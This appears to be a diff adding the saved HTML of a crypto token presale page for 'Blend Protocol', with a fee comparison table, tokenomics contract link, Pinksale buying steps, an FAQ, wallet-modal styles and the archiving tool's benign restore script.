+          <h2 class="text-2xl text-center font-medium tracking-tight  sm:text-4xl font-heading text-accent ">Ecosystem
+          </h2><img src="ecosystem.png" class="mx-auto" draggable="false"
+            style="transform: scale(0.2) translateZ(0px);">
+        </div>
+      </section>
+      <section class="relative flex items-center w-full ">
+        <div class="relative items-center w-full px-5 py-16 lg:py-24 mx-auto md:px-12 lg:px-16 max-w-7xl">
+          <h2 class="text-2xl text-center font-medium tracking-tight  sm:text-4xl font-heading text-accent ">Competitive
+            analysis</h2>
+          <div class="mt-16 overflow-x-auto">
+            <table class="mx-auto whitespace-nowrap">
+              <thead>
+                <tr>
+                  <th></th>
+                  <th>
+                    <div><img src="blend.png" class="w-32 mx-auto"></div>
+                  </th>
+                  <th>
+                    <div><img src="houdini.png" class="w-32 mx-auto"></div>
+                  </th>
+                  <th>
+                    <div><img src="flyp.svg" class="w-32 mx-auto"></div>
+                  </th>
+                  <th>
+                    <div><img src="fixed.png" class="w-32 mx-auto"></div>
+                  </th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr class=" even:bg-accent/5 first:border-t first:border-accent/20">
+                  <td class="p-6 w-72  text-center first:text-left ">TRANSACTION COST (%)</td>
+                  <td class="p-6 w-72  text-center first:text-left ">0.3</td>
+                  <td class="p-6 w-72  text-center first:text-left ">0.45</td>
+                  <td class="p-6 w-72  text-center first:text-left ">1</td>
+                  <td class="p-6 w-72  text-center first:text-left ">0.5 - 1</td>
+                </tr>
+                <tr class=" even:bg-accent/5 first:border-t first:border-accent/20">
+                  <td class="p-6 w-72  text-center first:text-left ">REVENUE SHARE</td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-accent rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                      </svg></div>
+                  </td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-red-600 rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                      </svg></div>
+                  </td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-accent rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                      </svg></div>
+                  </td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-accent rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                      </svg></div>
+                  </td>
+                </tr>
+                <tr class=" even:bg-accent/5 first:border-t first:border-accent/20">
+                  <td class="p-6 w-72  text-center first:text-left ">FEE-FREE PROGRAM</td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-accent rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                      </svg></div>
+                  </td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-red-600 rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                      </svg></div>
+                  </td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-red-600 rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                      </svg></div>
+                  </td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-red-600 rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                      </svg></div>
+                  </td>
+                </tr>
+                <tr class=" even:bg-accent/5 first:border-t first:border-accent/20">
+                  <td class="p-6 w-72  text-center first:text-left ">STAKING</td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-accent rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                      </svg></div>
+                  </td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-accent rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                      </svg></div>
+                  </td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-red-600 rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                      </svg></div>
+                  </td>
+                  <td class="p-6 w-72  text-center first:text-left ">
+                    <div class="grid mx-auto place-items-center h-10 w-10 bg-red-600 rounded-full"><svg
+                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
+                        stroke-linejoin="round" class=" text-xl" height="1em" width="1em"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                      </svg></div>
+                  </td>
+                </tr>
+              </tbody>
+              <tfoot>
+                <tr>
+                  <th></th>
+                  <th></th>
+                  <th></th>
+                  <th></th>
+                  <th></th>
+                </tr>
+              </tfoot>
+            </table>
+          </div>
+        </div>
+      </section>
+      <section class="relative flex items-center w-full " id="tokenomics">
+        <div class="relative items-center w-full px-5 pb-16 lg:pb-24 mx-auto md:px-12 lg:px-16 max-w-7xl">
+          <h2 class="text-2xl text-center font-medium tracking-tight  sm:text-4xl font-heading text-accent mb-6">
+            Tokenomics</h2><a target="_blank"
+            href="https://etherscan.io/address/0xd23b160e4a0db09ca35a79948e04cf6eafb5283a"
+            class="flex gap-1 mx-auto items-center justify-center text-2xl"><svg xmlns="http://www.w3.org/2000/svg"
+              class="w-5 h-5" fill="none" viewBox="0 0 122 122">
+              <path fill="#fff"
+                d="M25.29 57.914a5.156 5.156 0 015.181-5.156l8.59.028a5.164 5.164 0 015.164 5.164v32.48c.967-.287 2.209-.593 3.568-.913a4.3 4.3 0 003.317-4.187V45.04a5.165 5.165 0 015.164-5.165h8.607a5.165 5.165 0 015.164 5.165v37.393s2.155-.872 4.254-1.758a4.312 4.312 0 002.632-3.967V32.13a5.164 5.164 0 015.163-5.164H90.7a5.164 5.164 0 015.164 5.164v36.709c7.462-5.408 15.024-11.912 21.025-19.733a8.661 8.661 0 001.319-8.092A60.79 60.79 0 0015.361 20.577a60.789 60.789 0 00-7.284 70.67 7.688 7.688 0 007.334 3.8c1.628-.142 3.655-.345 6.065-.628a4.3 4.3 0 003.815-4.27l-.001-32.235z">
+              </path>
+              <path fill="#000"
+                d="M25.102 110.009a60.813 60.813 0 0063.371 5.013 60.816 60.816 0 0033.212-54.203c0-1.4-.065-2.785-.158-4.162-22.219 33.138-63.244 48.63-96.423 53.347">
+              </path>
+            </svg><span class="hidden sm:flex">Contract:</span> 0xd23b1...5283a</a><img src="tokenomics.png"
+            class="max-w-[600px] mx-auto mt-16 w-full">
+        </div>
+      </section>
+      <section class="relative flex items-center w-full ">
+        <div class="relative items-center w-full px-5 pb-16 lg:pb-24 mx-auto md:px-12 lg:px-16 max-w-7xl">
+          <h2 class="text-2xl text-center font-medium tracking-tight  sm:text-4xl font-heading text-accent mb-6">How To
+            Buy</h2>
+          <div class="grid lg:grid-cols-2 gap-16 mt-16">
+            <div class="  w-full mt-12  lg:mt-0 relative hidden lg:block">
+              <div
+                class="h-[400px] w-[400px] bg-accent rounded-full filter blur-[500px] absolute -translate-y-1/2 top-1/2 -left-[40px]">
+              </div><img class="object-cover object-center w-full mx-auto max-w-[200px]  lg:max-w-[500px] lg:mr-auto"
+                alt="hero" src="how.svg">
+            </div>
+            <div>
+              <div class="bg-accent/10 border border-accent p-6">
+                <div class="text-xl mb-2 font-bold">1. Send ETH, BNB, BUSD, USDC or USDT to your wallet</div>
+                <div class="max-w-[500px] w-full">Purchasing of BLEND tokens is on the Ethereum network since it’s an
+                  ERC-20 token. Make sure you have Send ETH, BNB, BUSD, USDC or USDT in your wallet to proceed.</div>
+              </div>
+              <div class="bg-accent/10 border border-accent p-6">
+                <div class="text-xl mb-2 font-bold">2. Purchase through Pinksale which will be in the Ethereum(ERC20)
+                  currency.</div>
+                <div class="max-w-[500px] w-full">Claiming will be at the same time as DEX Listing.</div>
+              </div>
+              <div class="bg-accent/10 border border-accent p-6">
+                <div class="text-xl mb-2 font-bold">3. Claim tokens on listing day</div>
+                <div class="max-w-[500px] w-full">All presale participants must claim their tokens from Pinksale using
+                  the same wallet they used to contribute.</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="relative flex items-center w-full ">
+        <div class="relative items-center w-full px-5 pb-16 lg:py-24 mx-auto md:px-12 lg:px-16 max-w-7xl">
+          <h2 class="text-2xl font-medium tracking-tight  sm:text-4xl font-heading text-accent mb-6 sm:leading-tight">
+            FREQUENTLY <br> ASKED QUESTIONS</h2>
+          <div class="w-full divide-y divide-white/10 rounded border border-white/10 bg-accent/5">
+            <details class="group p-4" open="">
+              <summary
+                class="relative cursor-pointer text-xl list-none pr-8 font-medium text-accent transition-colors duration-300 focus-visible:outline-none  [&amp;::-webkit-details-marker]:hidden">
+                What is Blend?<svg xmlns="http://www.w3.org/2000/svg"
+                  class="absolute right-0 top-1 h-4 w-4 shrink-0 stroke-accent transition duration-300 group-open:rotate-45"
+                  fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"
+                  aria-labelledby="title-ac21 desc-ac21">
+                  <title id="title-ac21">Open icon</title>
+                  <desc id="desc-ac21">icon that represents the state of the summary</desc>
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M12 4v16m8-8H4"></path>
+                </svg></summary>
+              <p class="mt-4 text-white">A cutting-edge privacy application, built on the Ethereum blockchain.</p>
+            </details>
+            <details class="group p-4">
+              <summary
+                class="relative cursor-pointer text-xl list-none pr-8 font-medium text-accent transition-colors duration-300 focus-visible:outline-none  [&amp;::-webkit-details-marker]:hidden">
+                Why Blend?<svg xmlns="http://www.w3.org/2000/svg"
+                  class="absolute right-0 top-1 h-4 w-4 shrink-0 stroke-accent transition duration-300 group-open:rotate-45"
+                  fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"
+                  aria-labelledby="title-ac24 desc-ac24">
+                  <title id="title-ac24">Open icon</title>
+                  <desc id="desc-ac24">icon that represents the state of the summary</desc>
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M12 4v16m8-8H4"></path>
+                </svg></summary>
+              <p class="mt-4 text-white">Blend Protocol is a ground-breaking solution that protects your transactions
+                from prying eyes, ensuring total confidentiality and anonymity.</p>
+            </details>
+            <details class="group p-4">
+              <summary
+                class="relative cursor-pointer text-xl list-none pr-8 font-medium text-accent transition-colors duration-300 focus-visible:outline-none  [&amp;::-webkit-details-marker]:hidden">
+                What Is Next For Blend?<svg xmlns="http://www.w3.org/2000/svg"
+                  class="absolute right-0 top-1 h-4 w-4 shrink-0 stroke-accent transition duration-300 group-open:rotate-45"
+                  fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"
+                  aria-labelledby="title-ac23 desc-ac23">
+                  <title id="title-ac23">Open icon</title>
+                  <desc id="desc-ac23">icon that represents the state of the summary</desc>
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M12 4v16m8-8H4"></path>
+                </svg></summary>
+              <p class="mt-4 text-white">Following the pre-sale, our primary focus will be on the comprehensive
+                development and successful launch of the Blend platform</p>
+            </details>
+            <details class="group p-4">
+              <summary
+                class="relative cursor-pointer text-xl list-none pr-8 font-medium text-accent transition-colors duration-300 focus-visible:outline-none  [&amp;::-webkit-details-marker]:hidden">
+                How does revenue sharing work<svg xmlns="http://www.w3.org/2000/svg"
+                  class="absolute right-0 top-1 h-4 w-4 shrink-0 stroke-accent transition duration-300 group-open:rotate-45"
+                  fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"
+                  aria-labelledby="title-ac23 desc-ac23">
+                  <title id="title-ac23">Open icon</title>
+                  <desc id="desc-ac23">icon that represents the state of the summary</desc>
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M12 4v16m8-8H4"></path>
+                </svg></summary>
+              <p class="mt-4 text-white">Blend Protocol is one of the only privacy based protocols that provide revenue
+                sharing. This means as a holder, every time someone transacts or uses our bridge/swap you will benefit!
+              </p>
+            </details>
+          </div>
+        </div>
+      </section>
+      <footer class="">
+        <div class="px-4 py-12 mx-auto overflow-hidden max-w-7xl sm:px-6 lg:px-8">
+          <nav class="flex flex-wrap justify-center -mx-5 -my-2" aria-label="Footer">
+            <div class="px-5 py-2"><a href="#home" class="text-sm text-gray-500 hover:text-accent">Home</a></div>
+            <div class="px-5 py-2"><a href="#ecosystem" class="text-sm text-gray-500 hover:text-accent">Ecosystem</a>
+            </div>
+            <div class="px-5 py-2"><a href="#tokenomics" class="text-sm text-gray-500 hover:text-accent">Tokenomics</a>
+            </div>
+            <div class="px-5 py-2"><a href="#roadmap" class="text-sm text-gray-500 hover:text-accent">Roadmap</a></div>
+          </nav>
+          <div class="flex justify-center mt-8 space-x-12"><span
+              class="inline-flex justify-center w-full gap-6 m-auto md:justify-start md:w-auto"><a
+                href="https://t.me/blendportal" target="_blank"
+                class=" transition fill-black hover:text-accent grid place-items-center text-2xl"><span
+                  class="sr-only">Telegram</span><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                  viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                  <path
+                    d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z">
+                  </path>
+                </svg></a><a href="https://twitter.com/blend_protocol" target="_blank"
+                class=" transition fill-black hover:text-accent grid place-items-center text-2xl"><span
+                  class="sr-only">Twitter</span>
+                <div> 𝕏</div>
+              </a><a href="mailto:contact@blendprotocol.io" target="_blank"
+                class=" transition fill-black hover:text-accent grid place-items-center text-2xl"><span
+                  class="sr-only">Email</span>
+                <div> <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 576 512" height="1em"
+                    width="1em" xmlns="http://www.w3.org/2000/svg">
+                    <path
+                      d="M160 448c-25.6 0-51.2-22.4-64-32-64-44.8-83.2-60.8-96-70.4V480c0 17.67 14.33 32 32 32h256c17.67 0 32-14.33 32-32V345.6c-12.8 9.6-32 25.6-96 70.4-12.8 9.6-38.4 32-64 32zm128-192H32c-17.67 0-32 14.33-32 32v16c25.6 19.2 22.4 19.2 115.2 86.4 9.6 6.4 28.8 25.6 44.8 25.6s35.2-19.2 44.8-22.4c92.8-67.2 89.6-67.2 115.2-86.4V288c0-17.67-14.33-32-32-32zm256-96H224c-17.67 0-32 14.33-32 32v32h96c33.21 0 60.59 25.42 63.71 57.82l.29-.22V416h192c17.67 0 32-14.33 32-32V192c0-17.67-14.33-32-32-32zm-32 128h-64v-64h64v64zm-352-96c0-35.29 28.71-64 64-64h224V32c0-17.67-14.33-32-32-32H96C78.33 0 64 14.33 64 32v192h96v-32z">
+                    </path>
+                  </svg></div>
+              </a></span></div>
+          <p class="mt-8 text-center"><span class="mx-auto mt-2 text-sm text-gray-500">Copyright © 2023 - 2024</span>
+          </p>
+        </div>
+      </footer>
+    </main><w3m-modal data-scrapbook-shadowdom="<!----><w3m-explorer-context data-id=&quot;partial-modal-explorer-context&quot; data-scrapbook-shadowdom=&quot;<!---->&quot;></w3m-explorer-context><w3m-theme-context data-id=&quot;partial-modal-theme-context&quot; data-scrapbook-shadowdom=&quot;<!---->&quot;></w3m-theme-context><w3m-wc-connection-context data-id=&quot;partial-modal-connection-context&quot; data-scrapbook-shadowdom=&quot;<!---->&quot;></w3m-wc-connection-context><w3m-account-context data-id=&quot;partial-modal-account-context&quot; data-scrapbook-shadowdom=&quot;<!---->&quot;></w3m-account-context><w3m-network-context data-id=&quot;partial-modal-network-context&quot; data-scrapbook-shadowdom=&quot;<!---->&quot;></w3m-network-context><div id=&quot;w3m-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; w3m-overlay &quot;><div class=&quot;w3m-container&quot; tabindex=&quot;0&quot;><!--?lit$3879905103$--></div></div><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: all 0.2s ease 0s; }
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: all 0.1s ease 0s; transform: scale(0.93); }
+}
+button::after { content: &quot;&quot;; position: absolute; inset: 0px; transition: background-color 0s ease 0s, all 0.2s ease 0s; }
+button:disabled { cursor: not-allowed; }
+button svg, button w3m-text { position: relative; z-index: 1; }
+input { border: none; outline: 0px; appearance: none; }
+img { display: block; }
+::selection { color: var(--w3m-accent-fill-color); background: var(--w3m-accent-color); }</style><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>:host { all: initial; }
+.w3m-overlay { inset: 0px; position: fixed; z-index: var(--w3m-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--w3m-overlay-background-color); backdrop-filter: var(--w3m-overlay-backdrop-filter); }
+@media (max-height: 720px) and (orientation: landscape) {
+  .w3m-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+.w3m-active { pointer-events: auto; }
+.w3m-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--w3m-background-border-radius) var(--w3m-background-border-radius) var(--w3m-container-border-radius) var(--w3m-container-border-radius); border: 1px solid var(--w3m-color-overlay); overflow: hidden; }
+.w3m-card { width: 100%; position: relative; border-radius: var(--w3m-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--w3m-color-overlay); background-color: var(--w3m-color-bg-1); color: var(--w3m-color-fg-1); }
+@media (max-width: 600px) {
+  .w3m-container { max-width: 440px; border-radius: var(--w3m-background-border-radius) var(--w3m-background-border-radius) 0 0; }
+  .w3m-card { border-radius: var(--w3m-container-border-radius) var(--w3m-container-border-radius) 0 0; }
+  .w3m-overlay { align-items: flex-end; }
+}
+@media (max-width: 440px) {
+  .w3m-container { border: 0px; }
+}</style>"></w3m-modal>
+  </div><wcm-modal data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-explorer-context><wcm-theme-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-theme-context><div id=&quot;wcm-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; wcm-overlay &quot;><div class=&quot;wcm-container&quot; tabindex=&quot;0&quot;><!--?lit$3879905103$--></div></div><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: all 0.2s ease 0s; }
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: all 0.1s ease 0s; transform: scale(0.93); }
+}
+button::after { content: &quot;&quot;; position: absolute; inset: 0px; transition: background-color 0s ease 0s, all 0.2s ease 0s; }
+button:disabled { cursor: not-allowed; }
+button svg, button wcm-text { position: relative; z-index: 1; }
+input { border: none; outline: 0px; appearance: none; }
+img { display: block; }
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }</style><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>:host { all: initial; }
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+.wcm-active { pointer-events: auto; }
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}</style>"></wcm-modal>
+  <script
+    data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({ mode: 'open' }); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script>
+</body>
+
+</html>
